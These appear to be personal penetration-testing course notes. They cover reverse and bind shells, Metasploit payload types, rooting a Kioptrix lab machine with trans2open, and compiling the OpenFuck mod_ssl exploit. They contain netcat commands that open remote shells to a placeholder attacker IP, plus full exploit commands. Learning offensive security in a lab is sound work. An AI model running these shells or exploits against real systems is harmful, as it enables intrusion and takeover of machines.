
	2.28.10 Reverse shells vs bind shells
	
	
Reverse shell 
- Most common
- Victim/target connects to you! You listen for victim's connection.
e.g. 
	nc -lvp 4444 (netcat -listening, verbose, port 4444) 
	we open up port 4444 on our machine
	
	on target machine
	
	nc <attacker's IP> 4444 -e /bin/sh
	connect to attacker IP on port 4444 execute bin/shell 
     	
     	nc -nvlp 4444
     	nc <attacker's IP> -e /bin/bash
     	whoami //user
     	hostname //hostname

2.30.00 Bind shell

We open up a port on target machine through exploit then connect. The target machine is listening on that port for us

	on attacker machine:
	nc <target IP> 4444
	
	on target machine:
	nc -lvp 4444 -e /bin/sh
	
	
Good because we can bypass firewalls by making the target listen for any traffic and just connect straight across.



	2.35.10 Staged vs Non-Staged payloads

Payload = what we run as exploit. We send to victim to try get a shell.

Non-Staged:
- Sends exploit shellcode all at once
- Larger in size & won't always work
e.g.
windows/meterpreter_reverse_tcp

Staged:
- Sends payload in stages
- Can be less stable
e.g.
windows/meterpreter/reverse_tcp   => Notice the / which breaks up files

If one type of payload does not work, try the other one. If reverse shell doesn't work try bind, staged and non-staged too.
If you're sure your exploit is right and nothing is working then change the payload.


	2.38.40 Gaining root with Metasploit
	
trans2open - searchsploit samba 2.2

Now load up metasploit:

	msfconsole

	search trans2open  

We know from our enumeration that the machine is running RHELinux so we can choose the linux module by typing:

	use 1

	options
	
	set rhosts 172.16.227.128
	
	options (check if set)
	
	show targets (good to check if there are multiple, the default one is not always right)
	
	run or exploit
	
If opening & closing shells (died). Please ensure you do not use port 4444 for real tests. The meterpreter/reverse_tcp staged payload did not work. We can view payload options by going 

	set payload linux/x86/[TAB]
	
Can't use meterpreter reverse shells  but can use, /shell_bind_tcp.

run payload & we get a shell!

whoami #root	hostname #kioptrix.level1



//////////////////////////////////////////////////////////////////////

	2.46.20	Manual Exploitation
	
mod ssl openfuck exploit on github
https://github.com/heltonWernik/OpenLuck

We install the folder and library and then have the .c file. We need to compile it which gcc does. Run the exploit ./open and view the arguments and usage

Once installed gcc -o open OpenFuck.c -lcrypto
	(we can call it whatever we want)

We see usage is ./open target box [port] [-c N]

And our target is 0x6b (use x key), don't need [port] b/c not running against ssl

./open 0x6b 172.16.227.128 -c 40


